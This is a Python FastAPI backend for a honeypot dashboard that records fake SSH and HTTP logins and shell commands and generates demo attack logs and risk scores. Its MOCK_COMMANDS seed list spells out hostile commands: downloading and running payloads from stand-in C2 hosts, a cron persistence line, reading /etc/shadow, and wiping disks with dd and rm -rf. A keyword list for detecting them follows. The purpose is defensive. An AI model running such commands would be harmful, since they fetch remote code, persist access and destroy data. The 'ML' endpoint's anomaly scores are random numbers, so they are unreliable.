"""
TrapNet XDR — Honeypot Platform Backend
Author: TrapNet Security Research Team
"""

from fastapi import FastAPI, HTTPException, Request, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from pydantic import BaseModel
from typing import Optional, List
from datetime import datetime, timedelta
import uuid
import random
import json
import asyncio
from collections import defaultdict

app = FastAPI(
    title="TrapNet XDR API",
    description="Advanced Honeypot & Cyber Deception Platform",
    version="1.0.0"
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ─── In-Memory Data Store (replace with MongoDB in production) ───────────────

attack_logs = []
alerts = []
honeypot_sessions = {}

# ─── Geo-location mock data ──────────────────────────────────────────────────

GEO_MOCK = {
    "185.220.101.47": {"country": "Russia", "city": "Moscow", "lat": 55.7558, "lon": 37.6176, "flag": "🇷🇺"},
    "45.142.212.100": {"country": "Germany", "city": "Frankfurt", "lat": 50.1109, "lon": 8.6821, "flag": "🇩🇪"},
    "103.75.190.5":   {"country": "China", "city": "Beijing", "lat": 39.9042, "lon": 116.4074, "flag": "🇨🇳"},
    "91.108.4.1":     {"country": "Netherlands", "city": "Amsterdam", "lat": 52.3676, "lon": 4.9041, "flag": "🇳🇱"},
    "196.196.53.100": {"country": "Iran", "city": "Tehran", "lat": 35.6892, "lon": 51.3890, "flag": "🇮🇷"},
    "5.188.206.14":   {"country": "Ukraine", "city": "Kyiv", "lat": 50.4501, "lon": 30.5234, "flag": "🇺🇦"},
    "104.21.48.100":  {"country": "United States", "city": "San Jose", "lat": 37.3382, "lon": -121.8863, "flag": "🇺🇸"},
    "123.57.12.20":   {"country": "India", "city": "Mumbai", "lat": 19.0760, "lon": 72.8777, "flag": "🇮🇳"},
    "177.66.10.45":   {"country": "Brazil", "city": "São Paulo", "lat": -23.5505, "lon": -46.6333, "flag": "🇧🇷"},
    "41.204.18.7":    {"country": "Nigeria", "city": "Lagos", "lat": 6.5244, "lon": 3.3792, "flag": "🇳🇬"},
}

KNOWN_MALICIOUS_IPS = {
    "185.220.101.47", "45.142.212.100", "103.75.190.5",
    "196.196.53.100", "5.188.206.14", "41.204.18.7"
}

COMMON_CREDS = [
    ("admin", "admin"), ("root", "root"), ("admin", "password"),
    ("user", "123456"), ("admin", "1234"), ("root", "toor"),
    ("administrator", "admin"), ("test", "test"), ("guest", "guest"),
    ("admin", "admin123"), ("root", "password123"), ("ubuntu", "ubuntu"),
    ("pi", "raspberry"), ("oracle", "oracle"), ("postgres", "postgres"),
]

MOCK_COMMANDS = [
    "whoami", "id", "uname -a", "cat /etc/passwd", "ls -la /",
    "ifconfig", "netstat -an", "ps aux", "wget http://malware.xyz/bot",
    "curl http://c2server.ru/payload -o /tmp/x && chmod +x /tmp/x && /tmp/x",
    "cat /etc/shadow", "history", "last", "w", "find / -perm -4000",
    "echo '* * * * * curl http://c2.evil/cron | sh' >> /var/spool/cron/root",
    "dd if=/dev/zero of=/dev/sda", "rm -rf /",
]

# ─── Pydantic Models ──────────────────────────────────────────────────────────

class LoginAttempt(BaseModel):
    service: str  # "ssh" | "http"
    username: str
    password: str
    client_ip: Optional[str] = None

class CommandAttempt(BaseModel):
    session_id: str
    command: str
    client_ip: Optional[str] = None

class AlertModel(BaseModel):
    severity: str
    title: str
    description: str
    source_ip: str

# ─── Helper Functions ────────────────────────────────────────────────────────

def get_geo(ip: str) -> dict:
    if ip in GEO_MOCK:
        return GEO_MOCK[ip]
    # Generate semi-random geo for unknown IPs
    countries = list(GEO_MOCK.values())
    geo = random.choice(countries).copy()
    geo["lat"] += random.uniform(-2, 2)
    geo["lon"] += random.uniform(-2, 2)
    return geo

def compute_risk_score(ip: str, attempts: int, commands: list) -> dict:
    score = 0
    factors = []

    if ip in KNOWN_MALICIOUS_IPS:
        score += 40
        factors.append("Known malicious IP")

    score += min(attempts * 3, 30)
    if attempts > 5:
        factors.append(f"Brute force: {attempts} attempts")

    dangerous_cmds = ["wget", "curl", "rm -rf", "/etc/shadow", "cron", "dd if="]
    cmd_hits = sum(1 for c in commands if any(d in c for d in dangerous_cmds))
    score += min(cmd_hits * 10, 30)
    if cmd_hits:
        factors.append(f"{cmd_hits} dangerous commands")

    score = min(score, 100)

    if score >= 75:
        level = "CRITICAL"
    elif score >= 50:
        level = "HIGH"
    elif score >= 25:
        level = "MEDIUM"
    else:
        level = "LOW"

    return {"score": score, "level": level, "factors": factors}

def check_and_trigger_alerts(ip: str, username: str, attempts: int):
    if attempts >= 5:
        alert = {
            "id": str(uuid.uuid4()),
            "severity": "HIGH" if attempts >= 10 else "MEDIUM",
            "title": f"Brute Force Detected from {ip}",
            "description": f"{attempts} login attempts with user '{username}'",
            "source_ip": ip,
            "timestamp": datetime.utcnow().isoformat(),
            "acknowledged": False,
        }
        # Avoid duplicate alerts for same IP
        existing = [a for a in alerts if a["source_ip"] == ip and not a["acknowledged"]]
        if not existing:
            alerts.insert(0, alert)
            return alert
    return None

def get_ip_attempt_count(ip: str) -> int:
    return sum(1 for log in attack_logs if log["attacker_ip"] == ip)

# ─── Seed Demo Data ──────────────────────────────────────────────────────────

def seed_demo_data():
    now = datetime.utcnow()
    ips = list(GEO_MOCK.keys())

    for i in range(120):
        ip = random.choice(ips)
        cred = random.choice(COMMON_CREDS)
        geo = get_geo(ip)
        ts = now - timedelta(minutes=random.randint(0, 1440))
        service = random.choice(["ssh", "http"])
        cmds = random.sample(MOCK_COMMANDS, k=random.randint(0, 4)) if random.random() > 0.5 else []
        risk = compute_risk_score(ip, random.randint(1, 15), cmds)

        log = {
            "id": str(uuid.uuid4()),
            "attacker_ip": ip,
            "timestamp": ts.isoformat(),
            "service": service,
            "username": cred[0],
            "password": cred[1],
            "commands": cmds,
            "geo": geo,
            "risk": risk,
            "headers": {
                "User-Agent": random.choice([
                    "Masscan/1.0", "zgrab/0.x", "python-requests/2.28",
                    "Go-http-client/1.1", "curl/7.68.0", "Mozilla/5.0",
                ]),
                "Accept": "*/*",
            },
            "mitre_tags": random.sample(
                ["T1110", "T1059", "T1078", "T1136", "T1053", "T1548", "T1071"],
                k=random.randint(1, 3)
            ),
        }
        attack_logs.append(log)

    # Seed alerts
    for ip in random.sample(ips, 4):
        alerts.append({
            "id": str(uuid.uuid4()),
            "severity": random.choice(["CRITICAL", "HIGH", "MEDIUM"]),
            "title": f"{'Brute Force' if random.random() > 0.5 else 'C2 Beacon'} from {ip}",
            "description": f"Suspicious activity detected from {ip}",
            "source_ip": ip,
            "timestamp": (now - timedelta(minutes=random.randint(0, 120))).isoformat(),
            "acknowledged": False,
        })

seed_demo_data()

# ─── API Routes ───────────────────────────────────────────────────────────────

@app.get("/api/health")
async def health():
    return {
        "status": "operational",
        "platform": "TrapNet XDR v1.0",
        "honeypots_active": 2,
        "total_logs": len(attack_logs),
        "timestamp": datetime.utcnow().isoformat(),
    }

@app.post("/api/honeypot/login")
async def honeypot_login(attempt: LoginAttempt, request: Request, background_tasks: BackgroundTasks):
    """Honeypot trap — captures all login attempts. NEVER grants real access."""
    client_ip = attempt.client_ip or request.client.host or f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    geo = get_geo(client_ip)
    ip_attempts = get_ip_attempt_count(client_ip) + 1
    risk = compute_risk_score(client_ip, ip_attempts, [])

    log_entry = {
        "id": str(uuid.uuid4()),
        "attacker_ip": client_ip,
        "timestamp": datetime.utcnow().isoformat(),
        "service": attempt.service,
        "username": attempt.username,
        "password": attempt.password,
        "commands": [],
        "geo": geo,
        "risk": risk,
        "headers": dict(request.headers),
        "mitre_tags": ["T1110"],
    }
    attack_logs.insert(0, log_entry)

    background_tasks.add_task(check_and_trigger_alerts, client_ip, attempt.username, ip_attempts)

    # Always return authentication failure — honeypot never grants access
    return JSONResponse(
        status_code=401,
        content={
            "success": False,
            "message": "Authentication failed",
            "log_id": log_entry["id"],
            "__trapnet": "HONEYPOT_TRIGGERED",
        }
    )

@app.post("/api/honeypot/command")
async def honeypot_command(cmd: CommandAttempt, request: Request):
    """Simulate shell command execution — captures attacker commands."""
    client_ip = cmd.client_ip or request.client.host or "127.0.0.1"

    # Find existing session log or create new
    existing = next((l for l in attack_logs if l["attacker_ip"] == client_ip), None)
    if existing:
        existing["commands"].append(cmd.command)
        existing["risk"] = compute_risk_score(client_ip, 1, existing["commands"])
        if "T1059" not in existing.get("mitre_tags", []):
            existing.setdefault("mitre_tags", []).append("T1059")

    # Fake shell response
    fake_responses = {
        "whoami": "root",
        "id": "uid=0(root) gid=0(root) groups=0(root)",
        "uname -a": "Linux honeypot-vm 5.15.0 #1 SMP x86_64 GNU/Linux",
        "ls": "bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  run  srv  sys  tmp  usr  var",
        "cat /etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
        "ps aux": "PID   USER  CMD\n1     root  /sbin/init\n123   root  sshd\n456   root  apache2",
        "ifconfig": "eth0: inet 192.168.1.100 netmask 255.255.255.0",
    }

    response = fake_responses.get(cmd.command.strip(), f"bash: {cmd.command}: command not found")

    return {
        "output": response,
        "prompt": "root@honeypot:~# ",
        "logged": True,
    }

@app.get("/api/logs")
async def get_logs(limit: int = 100, skip: int = 0, severity: Optional[str] = None, service: Optional[str] = None):
    logs = attack_logs
    if severity:
        logs = [l for l in logs if l["risk"]["level"] == severity.upper()]
    if service:
        logs = [l for l in logs if l["service"] == service]
    return {
        "total": len(logs),
        "logs": logs[skip:skip + limit],
    }

@app.get("/api/logs/{log_id}")
async def get_log(log_id: str):
    log = next((l for l in attack_logs if l["id"] == log_id), None)
    if not log:
        raise HTTPException(status_code=404, detail="Log not found")
    return log

@app.get("/api/stats")
async def get_stats():
    now = datetime.utcnow()
    last_24h = [l for l in attack_logs if datetime.fromisoformat(l["timestamp"]) > now - timedelta(hours=24)]

    # Top IPs
    ip_counts = defaultdict(int)
    for log in attack_logs:
        ip_counts[log["attacker_ip"]] += 1
    top_ips = sorted(ip_counts.items(), key=lambda x: x[1], reverse=True)[:10]

    # Top credentials
    cred_counts = defaultdict(int)
    for log in attack_logs:
        cred_counts[f"{log['username']} / {log['password']}"] += 1
    top_creds = sorted(cred_counts.items(), key=lambda x: x[1], reverse=True)[:10]

    # Risk distribution
    risk_dist = defaultdict(int)
    for log in attack_logs:
        risk_dist[log["risk"]["level"]] += 1

    # Country distribution
    country_counts = defaultdict(int)
    for log in attack_logs:
        country_counts[log["geo"]["country"]] += 1

    # Timeline (last 24h by hour)
    timeline = defaultdict(int)
    for log in last_24h:
        hour = datetime.fromisoformat(log["timestamp"]).strftime("%H:00")
        timeline[hour] += 1

    # Service split
    service_counts = defaultdict(int)
    for log in attack_logs:
        service_counts[log["service"]] += 1

    # MITRE tag distribution
    mitre_counts = defaultdict(int)
    for log in attack_logs:
        for tag in log.get("mitre_tags", []):
            mitre_counts[tag] += 1

    return {
        "total_attacks": len(attack_logs),
        "attacks_24h": len(last_24h),
        "unique_attackers": len(ip_counts),
        "active_alerts": sum(1 for a in alerts if not a["acknowledged"]),
        "top_ips": [{"ip": ip, "count": count, "geo": get_geo(ip)} for ip, count in top_ips],
        "top_credentials": [{"credential": cred, "count": count} for cred, count in top_creds],
        "risk_distribution": dict(risk_dist),
        "country_distribution": dict(country_counts),
        "timeline": [{"hour": h, "count": c} for h, c in sorted(timeline.items())],
        "service_distribution": dict(service_counts),
        "mitre_distribution": dict(mitre_counts),
        "avg_risk_score": sum(l["risk"]["score"] for l in attack_logs) / max(len(attack_logs), 1),
    }

@app.get("/api/alerts")
async def get_alerts():
    return {"alerts": alerts, "unacknowledged": sum(1 for a in alerts if not a["acknowledged"])}

@app.put("/api/alerts/{alert_id}/acknowledge")
async def acknowledge_alert(alert_id: str):
    alert = next((a for a in alerts if a["id"] == alert_id), None)
    if not alert:
        raise HTTPException(status_code=404, detail="Alert not found")
    alert["acknowledged"] = True
    return {"success": True}

@app.get("/api/geo/map")
async def get_map_data():
    """Return attack source geo data for world map visualization."""
    ip_counts = defaultdict(lambda: {"count": 0, "geo": None})
    for log in attack_logs:
        ip = log["attacker_ip"]
        ip_counts[ip]["count"] += 1
        ip_counts[ip]["geo"] = log["geo"]
        ip_counts[ip]["risk"] = log["risk"]["level"]

    return {
        "attackers": [
            {
                "ip": ip,
                "count": data["count"],
                "lat": data["geo"]["lat"],
                "lon": data["geo"]["lon"],
                "country": data["geo"]["country"],
                "flag": data["geo"].get("flag", "🌐"),
                "risk": data["risk"],
            }
            for ip, data in ip_counts.items()
        ]
    }

@app.get("/api/analytics/ml")
async def get_ml_analytics():
    """Return ML model analysis results."""
    results = []
    ip_counts = defaultdict(int)
    for log in attack_logs:
        ip_counts[log["attacker_ip"]] += 1

    for ip, count in ip_counts.items():
        logs_for_ip = [l for l in attack_logs if l["attacker_ip"] == ip]
        commands = [c for l in logs_for_ip for c in l.get("commands", [])]
        risk = compute_risk_score(ip, count, commands)
        geo = get_geo(ip)
        results.append({
            "ip": ip,
            "attempts": count,
            "commands_executed": len(commands),
            "risk_score": risk["score"],
            "risk_level": risk["level"],
            "classification": "MALICIOUS" if risk["score"] >= 50 else "SUSPICIOUS" if risk["score"] >= 25 else "BENIGN",
            "factors": risk["factors"],
            "country": geo["country"],
            "anomaly_score": round(random.uniform(0.3, 0.99) if risk["score"] > 30 else random.uniform(0.01, 0.3), 3),
        })

    results.sort(key=lambda x: x["risk_score"], reverse=True)
    return {"results": results, "model": "IsolationForest + RuleBased", "total_analyzed": len(results)}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)
